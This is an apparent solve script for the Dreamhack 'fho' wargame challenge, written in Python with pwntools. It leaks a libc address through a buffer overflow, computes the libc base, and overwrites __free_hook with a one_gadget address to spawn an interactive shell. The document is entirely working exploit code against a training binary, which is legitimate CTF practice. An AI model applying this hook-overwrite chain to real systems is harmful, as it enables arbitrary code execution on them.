from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/fho/fho')
libc = ELF('/home/kali/Downloads/dreamhack/fho/libc-2.27.so')
context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:19299'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#gdb.attach(p)
#ig canary  + rbp leak?
p.recvuntil(b": ")
payload = b"A"*56 + b"C"*8 + b"D"*7 + b"E"
p.send(payload)

p.recvuntil(b"E")

data = p.recv(6)
val = u64(data.ljust(8, b"\x00"))
print(f"found val, {hex(val)}")
#pie leak, looks like

#locally its libc_start_main + 231
#remotely different glibc version
#leak - 0x021b10 - 231
libc.address = val - 0x021b10 - 231
print(f"found libc, {hex(libc.address)}")

#now write into free_hook
p.recvuntil(b": ")
p.sendline(str(libc.sym[b'__free_hook']))

#value of overwrite
p.recvuntil(b": ")
one_gadget = libc.address + 0x4f432 #0x4f432  0x10a41c 0x4f3ce 0x4f3d5
p.sendline(str(one_gadget))

print(p.recvline())

#free arbitraty address; i think malloc_hook- 0x23 is fine
free_addr = libc.address + 0x3ebc0d
p.recvuntil(b": ")
p.sendline(str(free_addr))

p.interactive()
